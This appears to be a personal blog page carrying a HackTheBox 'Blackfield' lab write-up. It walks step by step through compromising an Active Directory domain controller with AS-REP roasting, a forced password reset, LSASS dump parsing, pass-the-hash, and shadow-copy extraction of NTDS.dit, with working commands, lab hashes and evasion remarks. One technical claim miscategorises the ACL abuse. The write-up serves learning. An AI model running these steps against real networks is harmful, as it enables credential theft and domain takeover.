@@ -1,0 +1,750 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>x0n1 Dropzone - Labs Reviews</title>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/assets/style.css">
+    <link href="https://unpkg.com/aos@next/dist/aos.css" rel="stylesheet" />
+    <link rel="icon" href="/assets/favicon.ico" type="image/x-icon">
+    <style>
+        .typed-terminal::after {
+            content: '_';
+            animation: blink 0.8s infinite step-start;
+            margin-left: 4px;
+        }
+
+        @keyframes blink {
+            50% {
+                opacity: 0;
+            }
+        }
+
+        .active-menu {
+            color: #ff2d55 !important;
+            font-weight: bold;
+        }
+
+        .menu li a .count {
+            font-size: 0.8em;
+            opacity: 0.6;
+            margin-left: 5px;
+        }
+
+        .dropdown-btn::after {
+            content: '▸';
+            float: right;
+            transition: transform 0.3s;
+        }
+
+        .dropdown-btn.open::after {
+            transform: rotate(90deg);
+        }
+
+        .menu li a:hover {
+            background: rgba(255, 45, 85, 0.1);
+            border-left: 4px solid #ff2d55;
+            padding-left: 6px;
+        }
+
+        .menu .dropdown-content {
+            padding-left: 20px;
+            margin-top: 6px;
+            margin-bottom: 10px;
+        }
+
+        .category-banner {
+            display: flex;
+            gap: 15px;
+            font-size: 0.9em;
+            margin-bottom: 10px;
+            animation: scrollBanner 10s linear infinite;
+            overflow: hidden;
+        }
+
+        .category-banner span {
+            background-color: #1c1c1e;
+            padding: 4px 10px;
+            border-radius: 4px;
+            color: #ff9f0a;
+        }
+
+        @keyframes scrollBanner {
+            0% {
+                transform: translateX(0);
+            }
+
+            100% {
+                transform: translateX(-100%);
+            }
+        }
+
+        .breadcrumb {
+            color: #aaa;
+            font-size: 0.9em;
+            margin-bottom: 10px;
+        }
+
+        .main-content {
+            padding-top: 60px;
+        }
+
+        .tag-sidebar .toc-list {
+            font-size: 0.9em;
+            line-height: 1.6em;
+            padding-left: 0;
+        }
+
+        .tag-sidebar .toc-list li {
+            margin-bottom: 6px;
+            list-style: none;
+        }
+
+        .tag-sidebar .sub-toc-list {
+            margin-top: 5px;
+            margin-bottom: 8px;
+            margin-left: 14px;
+            padding-left: 12px;
+            border-left: 1px solid #444;
+            font-size: 0.88em;
+            color: #999;
+        }
+
+        .tag-sidebar .sub-toc-list li {
+            margin-bottom: 4px;
+        }
+
+        .toc-link:hover {
+            color: #ff9f0a;
+            transform: translateX(2px);
+        }
+
+        .tag-sidebar .filter-options ul {
+            list-style: none;
+            padding-left: 20px;
+            margin-top: 4px;
+        }
+
+        .tag-sidebar .filter-options ul li {
+            margin-left: 8px;
+        }
+
+        .tag-sidebar .filter-options ul li a::before {
+            content: "▶";
+            color: orange;
+            margin-right: 6px;
+        }
+
+        .toc-link.active-toc {
+            font-weight: bold;
+            color: orange !important;
+        }
+
+        .section-block h2 {
+            margin-top: 60px;
+            margin-bottom: 10px;
+            scroll-margin-top: 120px;
+        }
+
+        .section-block h3 {
+            margin-top: 10px;
+            margin-bottom: 6px;
+            scroll-margin-top: 120px;
+        }
+
+        .toc-link:hover .toc-icon {
+            transform: scale(1.15);
+            transition: transform 0.2s ease;
+        }
+
+        .toc-link:hover {
+            background: rgba(255, 157, 10, 0.1);
+            color: #ff9f0a !important;
+            transform: translateX(3px);
+            transition: all 0.2s ease;
+        }
+
+        .section-block p,
+        .section-block ul,
+        .section-block ol {
+            margin-bottom: 20px;
+        }
+
+
+        code,
+        pre {
+            font-family: 'Fira Code', monospace;
+        }
+
+
+        .article-certificate {
+            display: block;
+            margin: 40px auto;
+            text-align: center;
+            background: rgba(255, 255, 255, 0.01);
+            padding: 12px 16px;
+            border: 1px solid rgba(255, 45, 85, 0.2);
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(255, 45, 85, 0.08);
+            width: fit-content;
+        }
+
+
+
+        .article-certificate img {
+            display: block;
+            max-width: 100%;
+            height: auto;
+            border-radius: 6px;
+            margin: 0 auto;
+        }
+
+        .article-certificate figcaption {
+            font-size: 0.75em;
+            color: #ccc;
+            margin-top: 6px;
+            text-align: center;
+            font-family: 'Fira Code', monospace;
+            opacity: 0.6;
+            line-height: 1.2;
+        }
+
+
+        .article-certificate:hover {
+            transform: scale(1.015);
+        }
+
+        .toc-link {
+            display: inline-block;
+            background: rgba(255, 255, 255, 0.05);
+            padding: 4px 8px;
+            border-radius: 6px;
+            margin: 2px 0;
+            font-size: 0.82em;
+            transition: background 0.2s, color 0.2s;
+            text-decoration: none;
+            color: #ff2d55;
+            transition: color 0.2s;
+        }
+
+        strong {
+            color: #ff5e7e;
+            font-weight: bold;
+        }
+
+        blockquote {
+            border-left: 4px solid #ff2d55;
+            padding-left: 1rem;
+            margin: 1.5rem 0;
+            color: #dddddd;
+            font-family: "Fira Code", monospace;
+            background-color: rgba(255, 255, 255, 0.03);
+            font-style: italic;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <aside class="sidebar">
+            <div class="logo"><a href="/index.html" style="color: #ff2d55; text-decoration: none;"><span
+                        class="typed-terminal"></span></a></div>
+            <ul class="menu">
+                <li><button class="dropdown-btn open">🖊️ Writeups</button>
+                    <ul class="dropdown-content" style="display: block;">
+                        <li><a href="/htb.html">HackTheBox <span class="count">(1)</span></a>
+                            <ul id="submenu-htb" class="dropdown-content"></ul>
+                        </li>
+                        <li><a href="/tryhackme.html" class="active-menu">TryHackMe <span class="count">(1)</span></a>
+                            <ul id="submenu-thm" class="dropdown-content"></ul>
+                        </li>
+                        <li><a href="/vulnhub.html">VulnHub <span class="count">(0)</span></a>
+                            <ul id="submenu-vulnhub" class="dropdown-content"></ul>
+                        </li>
+                    </ul>
+                </li>
+                <li><button class="dropdown-btn">🧪 Reviews</button>
+                    <ul class="dropdown-content">
+                        <li><a href="/exams.html">Certifications <span class="count">(1)</span></a>
+                            <ul id="submenu-exams" class="dropdown-content"></ul>
+                        </li>
+                        <li><a href="/courses.html">Courses <span class="count">(0)</span></a>
+                            <ul id="submenu-courses" class="dropdown-content"></ul>
+                        </li>
+                        <li><a href="/labs.html">Labs <span class="count">(1)</span></a>
+                            <ul id="submenu-labs" class="dropdown-content"></ul>
+                        </li>
+                    </ul>
+                </li>
+                <li><a href="/articles.html" style="color: #ff2d55; text-decoration: none;">📚 Articles <span
+                            class="count">(0)</span></a></li>
+                <li><a href="/about.html" style="color: #ff2d55; text-decoration: none;">🧐 Whoami</a></li>
+            </ul>
+        </aside>
+
+        <div class="content-area">
+            <main class="main-content">
+                <div class="breadcrumb" data-aos="fade-up">📂 Writeups / HackTheBox / Blackfield
+                </div>
+                <h1 class="section-title" data-aos="fade-up">Blackfield</h1>
+                <div class="section-block" data-aos="fade-up" data-aos-delay="200">
+                    <figure class="article-certificate">
+                        <img src="/assets/images/blackfield.png" alt="Blackfield" class="medium-style-zoom">
+                        <figcaption></figcaption>
+                    </figure>
+                    <h2 id="overview" style="color: orange;">Overview</h2>
+                    <p>Backfield was a <strong>hard-difficulty Windows</strong> machine on HackTheBox that simulated a
+                        full domain
+                        compromise through misconfigurations rather than exploits. The path involved enumeration through
+                        </trong>SMB</strong> and <strong>Kerberos</strong>, <strong>AS-REP Roasting</strong> to recover
+                        plaintext credentials, and abusing built-in
+                        privileges like <strong>SeBackupPrivilege</strong> to extract the Active Directory database via
+                        <strong>shadow copy</strong>. It required an
+                        understanding of Kerberos internals, credential dumping techniques, and privilege escalation
+                        using legitimate Windows features.</p>
+                    <h2 id="reconnaisance-enumeration" style="color: orange;">Initial Reconnaissance & Enumeration</h2>
+                    <p>The engagement began with a comprehensive TCP port scan to fingerprint exposed services and
+                        assess the surface area:</p>
+                    <div class="terminal-block">
+                        <div class="terminal-header">root@x0n1:~$</div>
+                        <pre><code><span>nmap -sC -sV --open -v -p- 10.10.10.192 -T4
+...
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-24 21:33:14Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+57174/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+                            </span></code></pre>
+                    </div>
+                    <p>The scan revealed classic signs of an <strong>Active Directory Domain Controller</strong>.<br>
+                        Notable ports included:</p>
+                    <ul>
+                        <li><strong>TCP/88</strong> (Kerberos): domain authentication protocol</li>
+                        <li><strong>TCP/389 and 3268</strong> (LDAP and Global Catalog): directory information services
+                        </li>
+                        <li><strong>TCP/445</strong> (SMB): potential file shares and named pipes</li>
+                        <li><strong>TCP/5985</strong> (WinRM): remote management endpoint</li>
+                        <li><strong>TCP/135/593/57174</strong> (MSRPC): key for DC-related operations like DCOM</li>
+                        <li><strong>TCP/53</strong> (DNS): name resolution within the domain</li>
+                    </ul>
+                    <p>This confirmed that we were dealing with a Windows Server machine acting as a DC for the domain
+                        <code>BLACKFIELD.local</code>. I moved quickly to check SMB, the most commonly misconfigured AD
+                        protocol.</p>
+                    <div class="terminal-block">
+                        <div class="terminal-header">root@x0n1:~$</div>
+                        <pre><code><span>smbclient -N -L //10.10.10.192
+
+Sharename       Type      Comment
+---------       ----      -------
+ADMIN$          Disk      Remote Admin
+C$              Disk      Default share
+forensic        Disk      Forensic / Audit share.
+IPC$            IPC       Remote IPC
+NETLOGON        Disk      Logon server share 
+profiles$       Disk      
+SYSVOL          Disk      Logon server share
+                            </span></code></pre>
+                    </div>
+                    <p><strong>Anonymous login</strong> was enabled. Several shares were visible, but
+                        <code>profiles$</code> stood out—it exposed directories typically named after domain users.</p>
+                    <div class="terminal-block">
+                        <div class="terminal-header">root@x0n1:~$</div>
+                        <pre><code><span>smbclient //10.10.10.192/profiles$</span></code></pre>
+                    </div>
+                    <div class="terminal-block">
+                        <div class="terminal-header">smb: \></div>
+                        <pre><code><span>.                                   D        0  Wed Jun  3 18:47:12 2020
+..                                  D        0  Wed Jun  3 18:47:12 2020
+AAlleni                             D        0  Wed Jun  3 18:47:11 2020
+ABarteski                           D        0  Wed Jun  3 18:47:11 2020
+ABekesz                             D        0  Wed Jun  3 18:47:11 2020
+ABenzies                            D        0  Wed Jun  3 18:47:11 2020
+ABiemiller                          D        0  Wed Jun  3 18:47:11 2020
+AChampken                           D        0  Wed Jun  3 18:47:11 2020
+ACheretei                           D        0  Wed Jun  3 18:47:11 2020
+ACsonaki                            D        0  Wed Jun  3 18:47:11 2020
+...
+YNyirenda                           D        0  Wed Jun  3 18:47:12 2020
+YPredestin                          D        0  Wed Jun  3 18:47:12 2020
+YSeturino                           D        0  Wed Jun  3 18:47:12 2020
+YSkoropada                          D        0  Wed Jun  3 18:47:12 2020
+YVonebers                           D        0  Wed Jun  3 18:47:12 2020
+YZarpentine                         D        0  Wed Jun  3 18:47:12 2020
+ZAlatti                             D        0  Wed Jun  3 18:47:12 2020
+ZKrenselewski                       D        0  Wed Jun  3 18:47:12 2020
+ZMalaab                             D        0  Wed Jun  3 18:47:12 2020
+ZMiick                              D        0  Wed Jun  3 18:47:12 2020
+ZScozzari                           D        0  Wed Jun  3 18:47:12 2020
+ZTimofeeff                          D        0  Wed Jun  3 18:47:12 2020
+ZWausik                             D        0  Wed Jun  3 18:47:12 2020
+                                </span></code></pre>
+                    </div>
+                    <p>I used this as a foundation for username enumeration by scraping the directory names and saving
+                        them into <strong>smb_users</strong>.</p>
+                    <h2 id="credential-access" style="color: orange;">Credential Access</h2>
+                    <h3 id="kerberos-enumeration" style="color: #ffc107;">Kerberos Enumeration</h3>
+                    <p>To identify valid users, I fed <code>smb_users</code> into <strong>Kerbrute</strong>:</p>
+                    <div class="terminal-block">
+                        <div class="terminal-header">root@x0n1:~$</div>
+                        <pre><code><span>kerbrute userenum -d blackfield.local --dc 10.10.10.192 smb_users  
+...
+
+2025/01/24 15:44:43 >  [+] VALID USERNAME:       audit2020@blackfield.local
+2025/01/24 15:46:36 >  [+] VALID USERNAME:       support@blackfield.local
+2025/01/24 15:46:41 >  [+] VALID USERNAME:       svc_backup@blackfield.local
+                                </span></code></pre>
+                    </div>
+                    <p>Kerbrute attempts <strong>TGT requests</strong> and distinguishes between “user does not exist”
+                        and other errors. I identified <code>audit2020</code>, <code>support</code>, and
+                        <code>svc_backup</code> as existing users.</p>
+                    <h3 id="asrep-roasting" style="color: #ffc107;">AS-REP Roasting</h3>
+                    <p>I then tested for accounts with Kerberos pre-authentication disabled with Impacket’s
+                        <code>GetNPUsers</code>:</p>
+                    <div class="terminal-block">
+                        <div class="terminal-header">root@x0n1:~$</div>
+                        <pre><code><span>GetNPUsers.py blackfield.local/ -dc-ip 10.10.10.192 -no-pass -usersfile kerbrute_users</span></code></pre>
+                    </div>
+                    <p><code>support</code> had the <code>DONT_REQ_PREAUTH</code> flag set. This enabled an
+                        <strong>AS-REP Roasting</strong> attack—a classic Kerberos misconfig exploitation technique.<br>
+                        I received an AS-REP encrypted with the NT hash of the user's password, which I saved into
+                        <code>hash.asrepfile</code>.</p>
+                    <p>So I launched a brute-force attack offline using <strong>Hashcat</strong>:</p>
+                    <div class="terminal-block">
+                        <div class="terminal-header">root@x0n1:~$</div>
+                        <pre><code><span>hashcat -m 18200 hash.asrep /usr/share/wordlists/rockyou.txt</span></code></pre>
+                    </div>
+                    <p>The password cracked almost instantly:</p>
+                    <div class="terminal-block">
+                        <pre><code><span>support : #00^BlackKnight</span></code></pre>
+                    </div>
+                    <p>This was my initial valid credential pair into the domain.</p>
+                    <h2 id="initial-access" style="color: orange;">Initial Access</h2>
+                    <p>With <code>support</code>, I authenticated and collected domain information via
+                        <strong>BloodHound</strong>:</p>
+                    <div class="terminal-block">
+                        <div class="terminal-header">root@x0n1:~$</div>
+                        <pre><code><span>bloodhound-python -d blackfield.local -u support -p '#00^BlackKnight' -c all -ns 10.10.10.192</span></code></pre>
+                    </div>
+                    <p>I wanted to explore whether this user had any control over other domain accounts — particularly
+                        those discovered earlier like <code>audit2020</code>.</p>
+                    <p>To investigate this, I checked the BloodHound data and identified a direct edge:</p>
+                    <figure class="article-certificate">
+                        <img src="/assets/images/Blackfield_02_bloodhound.png" alt="Bloodhound"
+                            class="medium-style-zoom">
+                        <figcaption>Bloodhound</figcaption>
+                    </figure>
+                    <p>This meant that <code>support</code> had the <strong>ForceChangePassword</strong> permission over
+                        <code>audit2020</code>, allowing me to reset the password without needing the old one. This is a
+                        form of abuse that’s often missed in AD reviews because it’s not classified under typical full
+                        control permissions like <strong>GenericAll</strong>, but it’s just as dangerous if leveraged
+                        correctly.</p>
+                    <p>So I connected via RPC:</p>
+                    <div class="terminal-block">
+                        <div class="terminal-header">root@x0n1:~$</div>
+                        <pre><code><span>rpcclient -U blackfield/support 10.10.10.192</span></code></pre>
+                    </div>
+                    <p>And executed the password change:</p>
+                    <div class="terminal-block">
+                        <div class="terminal-header">rpcclient $></div>
+                        <pre><code><span>setuserinfo2 audit2020 23 x0n1On!</span></code></pre>
+                    </div>
+                    <p>The command succeeded. The password reset operation completed successfully, and I was able to authenticate using SMB shortly after.</p>
+                    <p>In enterprise environments, it’s not uncommon to find legacy or unused accounts still active due to stale change management practices, making them ideal pivot points for attackers.</p>
+                    <p>This kind of ACL abuse falls under the broader category of <strong>resource-based constrained delegation</strong> or <strong>identity takeover through object control</strong>, and it’s a potent weapon for lateral movement if not properly mitigated.</p>
+                    <p>With the new credentials I authenticated to the <code>forensic</code> share and explored its contents:</p>
+                    <div class="terminal-block">
+                        <div class="terminal-header">root@x0n1:~$</div>
+                        <pre><code><span>smbclient //10.10.10.192/forensic -U audit2020</span></code></pre>
+                    </div>
+                    <div class="terminal-block">
+                        <div class="terminal-header">smb: \></div>
+                        <pre><code><span>.                                   D        0  Sun Feb 23 14:03:16 2020
+..                                  D        0  Sun Feb 23 14:03:16 2020
+commands_output                     D        0  Sun Feb 23 19:14:37 2020
+memory_analysis                     D        0  Thu May 28 22:28:33 2020
+tools                               D        0  Sun Feb 23 14:39:08 2020
+                        </span></code></pre>
+                    </div>
+                    <p>Inside the <code>memory_analysis</code> folder, I found a series of zipped process dumps—among them was <code>lsass.zip</code>, which immediately stood out as a high-value target.<br>
+                        So I downloaded it:</p>
+                    <div class="terminal-block">
+                        <div class="terminal-header">smb: memory_analysis\></div>
+                        <pre><code><span>.                                   D        0  Thu May 28 22:28:33 2020
+..                                  D        0  Thu May 28 22:28:33 2020
+conhost.zip                         A 37876530  Thu May 28 22:25:36 2020
+ctfmon.zip                          A 24962333  Thu May 28 22:25:45 2020
+dfsrs.zip                           A 23993305  Thu May 28 22:25:54 2020
+dllhost.zip                         A 18366396  Thu May 28 22:26:04 2020
+ismserv.zip                         A  8810157  Thu May 28 22:26:13 2020
+lsass.zip                           A 41936098  Thu May 28 22:25:08 2020
+mmc.zip                             A 64288607  Thu May 28 22:25:25 2020
+RuntimeBroker.zip                   A 13332174  Thu May 28 22:26:24 2020
+ServerManager.zip                   A 131983313  Thu May 28 22:26:49 2020
+sihost.zip                          A 33141744  Thu May 28 22:27:00 2020
+smartscreen.zip                     A 33756344  Thu May 28 22:27:11 2020
+svchost.zip                         A 14408833  Thu May 28 22:27:19 2020
+taskhostw.zip                       A 34631412  Thu May 28 22:27:30 2020
+winlogon.zip                        A 14255089  Thu May 28 22:27:38 2020
+wlms.zip                            A  4067425  Thu May 28 22:27:44 2020
+WmiPrvSE.zip                        A 18303252  Thu May 28 22:27:53 2020
+                        </span></code></pre>
+                    </div>
+                    <h2 id="credential-dumping" style="color: orange;">Credential Dumping (LSASS Analysis)</h2>
+                    <p>The file <code>lsass.zip</code> retrieved from the forensic share turned out to contain a memory dump of the LSASS (Local Security Authority Subsystem Service) process.</p>
+                    <p>This is one of the most sensitive areas of memory in a Windows system, responsible for enforcing the system's security policy. It handles authentication, credential caching, and stores NTLM hashes, Kerberos tickets, and even plaintext passwords in some cases.</p>
+                    <div class="terminal-block">
+                        <div class="terminal-header">root@x0n1:~$</div>
+                        <pre><code><span>unzip lsass.zip
+
+Archive:  lsass.zip
+inflating: lsass.DMP
+                        </span></code></pre>
+                    </div>
+                    <p>I then ran <strong>PyPyKatz</strong> — a Python port of Mimikatz — against the dump:</p>
+                    <div class="terminal-block">
+                        <div class="terminal-header">root@x0n1:~$</div>
+                        <pre><code><span>pypykatz lsa minidump lsass.DMP
+
+
+FILE: ======== lsass.DMP =======
+== LogonSession ==
+authentication_id 406458 (633ba)
+session_id 2
+username svc_backup
+domainname BLACKFIELD
+logon_server DC01
+logon_time 2020-02-23T18:00:03.423728+00:00
+sid S-1-5-21-4194615774-2175524697-3563712290-1413
+luid 406458
+    == MSV ==
+    Username: svc_backup
+    Domain: BLACKFIELD
+    LM: NA
+    NT: 9658d1d1dcd9250115e2205d9f48400d
+    SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
+    DPAPI: a03cd8e9d30171f3cfe8caad92fef62100000000
+...
+                        </span></code></pre>
+                    </div>
+                    <p>This hash could now be used in pass-the-hash style authentication scenarios to access services like WinRM without needing the plaintext password.</p>
+                    <h2 id="privilege-escalation" style="color: orange;">Privilege Escalation</h2>
+                    <p>With <code>svc_backup</code>'s hash, I opened a WinRM shell:</p>
+                    <div class="terminal-block">
+                        <div class="terminal-header">root@x0n1:~$</div>
+                        <pre><code><span>evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d</span></code></pre>
+                    </div>
+                    <p>I navigated to the user’s desktop and read <code>user.txt</code>.</p>
+                    <p>Then I assessed the user’s privilege level:</p>
+                    <div class="terminal-block">
+                        <div class="terminal-header">*Evil-WinRM* PS C:\></div>
+                        <pre><code><span>whoami /groups
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID          Attributes
+========================================== ================ ============ 
+BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory                             
+                        </span></code></pre>
+                    </div>
+                    <p>The user was a member of <code>BUILTIN\Backup Operators</code>. This group grants the <strong>SeBackupPrivilege</strong>, which allows reading any file on the system—even those protected by ACLs—by requesting access as a backup operation. This was the key to lateral escalation.</p>
+                    <p>I confirmed the privilege:</p>
+                    <div class="terminal-block">
+                        <div class="terminal-header">*Evil-WinRM* PS C:\></div>
+                        <pre><code><span>whoami /priv
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeBackupPrivilege             Back up files and directories  Enabled
+SeRestorePrivilege            Restore files and directories  Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled                           
+                        </span></code></pre>
+                    </div>
+                    <p>So I attempted to copy the Administrator’s Desktop folder using <code>robocopy</code> with backup mode:</p>
+                    <div class="terminal-block">
+                        <div class="terminal-header">*Evil-WinRM* PS C:\></div>
+                        <pre><code><span>robocopy /b C:\Users\Administrator\Desktop C:\temp</span></code></pre>
+                    </div>
+                    <p>Although I couldn’t access <code>root.txt</code> (<i>because the file was encrypted, and only Administrator could open it</i>), I successfully recovered <code>notes.txt</code> which referenced audit changes:</p>
+                    <div class="terminal-block">
+                        <div class="terminal-header">root@x0n1:~$</div>
+                        <pre><code><span>After the domain compromise and computer forensic last week, auditors advised us to:
+- change every passwords -- Done.
+- change krbtgt password twice -- Done.
+- disable auditor's account (audit2020) -- KO.
+- use nominative domain admin accounts instead of this one -- KO.
+
+We will probably have to backup & restore things later.
+- Mike.
+
+PS: Because the audit report is sensitive, I have encrypted it on the desktop (root.txt)
+                        </span></code></pre>
+                    </div>
+                    <h2 id="domain-persistence" style="color: orange;">Domain Persistence (Dumping the NTDS Database)</h2>
+                    <p>Rather than try to access the <code>ntds.dit</code> file directly—which would fail because it’s constantly in use—I leveraged a classic technique: abusing <strong>Volume Shadow Copy</strong> through <code><a
+                        href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow" target="_blank"
+                        rel="noopener" style="color: #ff2d55;">diskshadow</a></code></p>
+                    <h4 style="color: #ffc107;">Step 1: Upload the Tools</h4>
+                    <p>First, I uploaded two PowerShell modules that facilitate privileged file copying using <code>SeBackupPrivilege</code>. These were part of the <a
+                        href="https://github.com/giuliano108/SeBackupPrivilege" target="_blank"
+                        rel="noopener" style="color: #ff2d55;">SeBackupPrivilege Abuse Toolkit</a></p>
+                    <p>Then, I imported them in the PowerShell session:</p>
+                    <div class="terminal-block">
+                        <div class="terminal-header">*Evil-WinRM* PS C:\></div>
+                        <pre><code><span>Import-Module .\SeBackupPrivilegeCmdLets.dll
+Import-Module .\SeBackupPrivilegeUtils.dll
+                        </span></code></pre>
+                    </div>
+                    <h4 style="color: #ffc107;">Step 2: Craft the DiskShadow Script</h4>
+                    <p>I prepared a script to create a VSS (Volume Shadow Copy) of the system drive <code>C:</code> and expose it as a new drive letter. This is the safest and cleanest way to access locked files like <code>ntds.dit</code>.</p>
+                    <p>Here’s the script I used (<code>vss.dsh</code>):</p>
+                    <div class="terminal-block">
+                        <pre><code><span>set context persistent nowriters
+set metadata c:\programdata\x0n1.cab
+set verbose on
+add volume c: alias x0n1
+create
+expose %x0n1% z:</span></code></pre>
+                    </div>
+                    <ul>
+                        <li>
+                          <code>set context persistent nowriters</code>
+                          <ul>
+                            <li>🔍 <strong>Purpose:</strong> Tells <code>diskshadow</code> to create a shadow copy that will persist after the script ends (<code>persistent</code>), and not to pause or coordinate with volume writers (<code>nowriters</code>).</li>
+                            <li>📁 <strong>Why this path:</strong> Writers (like VSS-aware applications or the OS) often lock or delay file access to prevent inconsistency. Setting <code>nowriters</code> skips that coordination, making the operation faster and stealthier.</li>
+                          </ul>
+                        </li>
+                      
+                        <li>
+                          <code>set metadata c:\programdata\x0n1.cab</code>
+                          <ul>
+                            <li>🔍 <strong>Purpose:</strong> Specifies a path where metadata about the shadow copy will be stored.</li>
+                            <li>📁 <strong>Why this path:</strong> <code>C:\ProgramData</code> is writable by most users with local privileges and is a discreet location.</li>
+                          </ul>
+                        </li>
+                      
+                        <li>
+                          <code>set verbose on</code>
+                          <ul>
+                            <li>🔍 <strong>Purpose:</strong> Enables verbose output for debugging and visibility.</li>
+                            <li>📁 <strong>Why this path:</strong> You’ll see detailed output of each operation — helpful if the shadow copy fails or if you’re scripting the process and want logs.</li>
+                          </ul>
+                        </li>
+                      
+                        <li>
+                          <code>add volume c: alias x0n1</code>
+                          <ul>
+                            <li>🔍 <strong>Purpose:</strong> Adds the <code>C:</code> volume to the snapshot context and assigns it an alias (<code>x0n1</code>) for reference in later commands.</li>
+                            <li>📁 <strong>Why this path:</strong> This allows you to reference <code>%x0n1%</code> dynamically in subsequent commands—useful for scripting and for avoiding hardcoded paths.</li>
+                          </ul>
+                        </li>
+                      
+                        <li>
+                          <code>create</code>
+                          <ul>
+                            <li>🔍 <strong>Purpose:</strong> Triggers the actual creation of the shadow copy.</li>
+                          </ul>
+                        </li>
+                      
+                        <li>
+                          <code>expose %x0n1% z:</code>
+                          <ul>
+                            <li>🔍 <strong>Purpose:</strong> Mounts the shadow copy as the <code>Z:</code> drive so you can browse and interact with its contents.</li>
+                            <li>📁 <strong>Why this path:</strong> Files like <code>C:\Windows\NTDS\ntds.dit</code> and <code>C:\Windows\System32\config\SYSTEM</code> are locked during normal operation. But the VSS copy is read-only and not in use, so you can copy them without interference or triggering detection.</li>
+                          </ul>
+                        </li>
+                    </ul>
+                    <p>📌 <strong>Note</strong>: Before uploading the script from Linux, I converted it to Windows line endings using <code>unix2dos</code>, otherwise <code>diskshadow</code> would throw syntax errors.</p>
+                    <h4 style="color: #ffc107;">Step 3: Execute DiskShadow</h4>
+                    <p>I ran the script on the target machine:</p>
+                    <div class="terminal-block">
+                        <div class="terminal-header">*Evil-WinRM* PS C:\></div>
+                        <pre><code><span>diskshadow /s vss.dsh</span></code></pre>
+                    </div>
+                    <p>This created a snapshot of the system drive and mounted it as <code>Z:</code>, providing read access to files like <code>ntds.dit</code> that are normally locked.</p>
+                    <h4 style="color: #ffc107;">Step 4: Copy the Target Files</h4>
+                    <p>With the shadow volume exposed, I used the custom <code>Copy-FileSeBackupPrivilege</code> command to extract the sensitive files:</p>
+                    <div class="terminal-block">
+                        <div class="terminal-header">*Evil-WinRM* PS C:\></div>
+                        <pre><code><span>Copy-FileSeBackupPrivilege z:\Windows\NTDS\ntds.dit ntds.dit</span></code></pre>
+                    </div>
+                    <p>Then I dumped the SYSTEM registry hive, which is needed to extract the Boot Key used to decrypt parts of the <code>ntds.dit</code> file:</p>
+                    <div class="terminal-block">
+                        <div class="terminal-header">*Evil-WinRM* PS C:\></div>
+                        <pre><code><span>reg.exe save hklm\system system.sav</span></code></pre>
+                    </div>
+                    <p>And finally downloaded them to my machine.</p>
+                    <h2 id="credential-extraction" style="color: orange;">Credential Extraction & Final Compromise</h2>
+                    <p>With both <code>ntds.dit</code> and the SYSTEM hive in my possession—exfiltrated using SeBackupPrivilege and Volume Shadow Copy—I moved to the final phase: extracting domain password hashes.</p>
+                    <p>Impacket’s <code>secretsdump.py</code> automates the process of extracting and decrypting those hashes by combining both files.<br>
+                        Among the output, I recovered the NTLM hash for the built-in Domain Administrator:</p>
+                    <div class="terminal-block">
+                        <div class="terminal-header">root@x0n1:~$</div>
+                        <pre><code><span>secretsdump.py -system system.sav -ntds ntds.dit LOCAL
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
+...
+                        </span></code></pre>
+                    </div>
+                    <p>Since NTLM authentication was available on the target system and WinRM was open, I leveraged a pass-the-hash attack to impersonate the administrator without ever needing the plaintext password:</p>
+                    <div class="terminal-block">
+                        <div class="terminal-header">root@x0n1:~$</div>
+                        <pre><code><span>evil-winrm -i 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee</span></code></pre>
+                    </div>
+                    <p>This gave me full, interactive remote access with domain-level privileges. Navigating to the Administrator’s Desktop, I finally retrieved <code>root.txt</code></p>
+            </main>
+
+            <aside class="tag-sidebar">
+                <div class="filter-group active">
+                    <button class="filter-toggle">📑 Table Of Contents</button>
+                    <ul class="filter-options" style="font-size: 0.9em; padding-left: 0; list-style: none;">
+                        <li><a class="toc-link" href="#overview">Overview</a></li>
+                        <li><a class="toc-link" href="#reconnaisance-enumeration">Initial Reconnaissance</a></li>
+                        <li>
+                            <a class="toc-link" href="#credential-access">Credential Access</a>
+                            <ul style="margin-left: 16px; list-style: none;">
+                                <li><a class="toc-link subsection" href="#kerberos-enumeration">Kerberos Enumeration</a></li>
+                                <li><a class="toc-link subsection" href="#asrep-roasting">AS-REP Roasting</a></li>
+                            </ul>
+                        </li>
+                        <li><a class="toc-link" href="#initial-access">Initial Access</a></li>
+                        <li><a class="toc-link" href="#credential-dumping">Credential Dumping</a></li>
+                        <li><a class="toc-link" href="#privilege-escalation">Privilege Escalation</a></li>
+                        <li><a class="toc-link" href="#domain-persistence">Domain Persistence</a></li>
+                        <li><a class="toc-link" href="#credential-extraction">Credential Extraction</a></li>
+                    </ul>
+                </div>
